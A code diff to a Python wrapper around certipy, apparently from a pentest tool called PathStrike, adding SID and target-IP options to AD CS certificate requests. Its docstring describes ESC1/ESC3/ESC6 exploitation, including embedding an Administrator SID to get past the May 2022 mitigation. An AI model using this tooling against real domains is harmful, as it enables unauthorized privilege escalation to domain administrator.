@@ -851,27 +851,48 @@ async def certipy_request(
     auth_args: list[str],
     upn: str | None = None,
     on_behalf_of: str | None = None,
+    sid: str | None = None,
+    target_ip: str | None = None,
     timeout: int = 60,
 ) -> dict[str, Any]:
     """Request a certificate from a Certificate Authority.
 
     Args:
-        target: Domain controller host or IP.
+        target: Hostname for ``-target`` — preferably the CA's FQDN.
+            certipy uses this for the RPC connection to the CA.  Passing
+            the bare DC IP causes certipy to fall back to NETBIOS name
+            resolution, which times out on most pentest networks; pass
+            the FQDN here and use *target_ip* to override DNS.
         ca: Certificate Authority name (e.g. ``"CORP-CA"``).
         template: Certificate template name.
         auth_args: Authentication arguments.
         upn: Alternate UPN to specify in the SAN (ESC1/ESC6 exploitation).
         on_behalf_of: Request certificate on behalf of another user (ESC3).
+        sid: Object SID to embed in the SAN URL extension.  Required by
+            modern AD environments that enforce the
+            ``szOID_NTDS_CA_SECURITY_EXT`` mitigation (May 2022 patch).
+            Pass the target principal's SID (e.g.
+            ``"S-1-5-21-...-500"`` for Administrator).  When omitted on
+            an environment that requires it, PKINIT will fail with
+            ``KDC_ERR_CLIENT_NOT_TRUSTED`` after issuance.
+        target_ip: Explicit IP override for *target*.  When set, certipy
+            connects to this IP instead of resolving *target* via DNS.
+            Use this so PathStrike works on attacker hosts without
+            ``/etc/hosts`` entries for the target domain.
 
     Returns:
         Result dict. On success, ``parsed["pfx_path"]`` contains the PFX output path.
     """
     args = ["-target", target, "-ca", ca, "-template", template] + auth_args
 
+    if target_ip:
+        args.extend(["-target-ip", target_ip])
     if upn:
         args.extend(["-upn", upn])
     if on_behalf_of:
         args.extend(["-on-behalf-of", on_behalf_of])
+    if sid:
+        args.extend(["-sid", sid])
 
     return await run_certipy("req", args, timeout=timeout)
 
